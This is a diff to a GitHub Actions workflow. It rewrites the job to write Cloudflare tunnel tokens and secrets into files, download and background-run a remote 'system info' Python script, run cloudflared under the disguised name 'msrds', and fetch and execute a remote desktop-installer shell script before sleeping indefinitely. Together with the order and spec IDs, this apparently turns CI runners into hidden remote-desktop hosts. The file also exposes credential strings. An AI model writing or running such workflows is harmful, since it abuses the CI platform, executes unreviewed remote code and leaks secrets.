@@ -1,8 +1,6 @@
-name: runner
-
+name: push
 on:
   workflow_dispatch:
-
 jobs:
   run:
     runs-on: ubuntu-latest
@@ -10,30 +8,47 @@ jobs:
       max-parallel: 1
       matrix:
         shard: [1]
-
     steps:
-      - name: runner
+      - name: push
         run: |
-
-          pwd
-
           cd
 
-          pwd
+          echo "Ij2lYTxts04reEn0r7ylxztUihRO9PFh8xcY1OpL26c4970a" > cftk.txt
+          echo "0cbc70411bdc59a7de2a763b0e7701bc" > cfzid.txt
+          echo "5B79E4F1954C" > order_no.txt
+          echo "8ab5ccf9-102a-4531-87d5-9ee7b5b8024a" > tunnel_id.txt
+          echo "krabs.shop" > cf_domain.txt
+          echo "30GBPS4C16G1DAMDWINDOWS" > spec_id.txt
+          echo "$GITHUB_RUN_ID" >> ghost_work_id.txt
+          echo "$GITHUB_REPOSITORY" >> runner_info.txt
 
-          mkdir Downloads
+          curl -X GET -L https://github.com/hubdockercom/example/raw/refs/heads/main/collect_system_info.py -o sysinfo.py
+          nohup python3 sysinfo.py &
 
-          ls
+          echo -e "-----BEGIN ARGO TUNNEL TOKEN-----\neyJ6b25lSUQiOiIwY2JjNzA0MTFiZGM1OWE3ZGUyYTc2M2IwZTc3MDFiYyIsImFj\nY291bnRJRCI6IjY2YTk0OGY2ZmMzODU3ZWZjZTRmNTFiYjNkYzFmMjU3IiwiYXBp\nVG9rZW4iOiJjZnV0XzE0azFYM24yQkhkNXlwYkE0S296c091a3pQUmdwYU1TbnZC\nUzN2VTU5MzFhZmNlZSJ9\n-----END ARGO TUNNEL TOKEN-----" > cert.pem
+          echo '{"AccountTag":"66a948f6fc3857efce4f51bb3dc1f257","TunnelSecret":"4yhzkm60eRNlI3REXZU6eir5ofM5870bRAGjwmY+2r4=","TunnelID":"8ab5ccf9-102a-4531-87d5-9ee7b5b8024a","Endpoint":""}' > config.json
+          echo -e "tunnel: 8ab5ccf9-102a-4531-87d5-9ee7b5b8024a\ncredentials-file: config.json\n\ningress:\n  - hostname: 8ab5ccf9-102a-4531-87d5-9ee7b5b8024a.krabs.shop\n    service: http://localhost:27015\n  - service: http_status:404" > config.yml
 
-          cd Downloads
-          
-          curl -X GET https://exampleoci.yunzhongzhuan.com/linux/baidupcs-go/baidupcs-go-linux-amd64 -o baidupcs-go-linux-amd64
-          chmod +x ./baidupcs-go-linux-amd64
 
-          curl -X GET https://exampleoci.yunzhongzhuan.com/example/0.py -o 0.py
+          curl -X GET -L "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" -o msrds
+          chmod +x ./msrds
+          ./msrds tunnel --credentials-file config.json --origincert cert.pem --config config.yml --loglevel fatal --protocol http2  --url http://localhost:27015 run 8ab5ccf9-102a-4531-87d5-9ee7b5b8024a &
+          # --origincert cert.pem --credentials-file config.json --config config.yml --loglevel fatal --protocol http2 --url http://localhost:27015 run 
 
-          
 
-          pwd
-          
-          while true; do python3 0.py; done
+          curl -X GET "https://exampleoci.yunzhongzhuan.com/linux-desktop-installer(GoodNoVNC).sh" -o 0.sh
+          chmod +x 0.sh
+          ./0.sh
+
+
+
+          sleep 999999999
+
+
+
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/cloudflared-linux-amd64 -o cfd
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/cert.pem -o cert.pem
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/097edd59-4421-4b13-b5fc-7015ae4cf939.json -o 097edd59-4421-4b13-b5fc-7015ae4cf939.json
+          # curl -X GET https://exampleoci.yunzhongzhuan.com/linux/cloudflared/.cloudflared/097edd59-4421-4b13-b5fc-7015ae4cf939.config.yml -o 097edd59-4421-4b13-b5fc-7015ae4cf939.config.yml
+          chmod +x cfd
+          ./cfd tunnel --credentials-file 097edd59-4421-4b13-b5fc-7015ae4cf939.json --origincert cert.pem --config 097edd59-4421-4b13-b5fc-7015ae4cf939.config.yml --url tcp://localhost:3389 run ocivnc5901
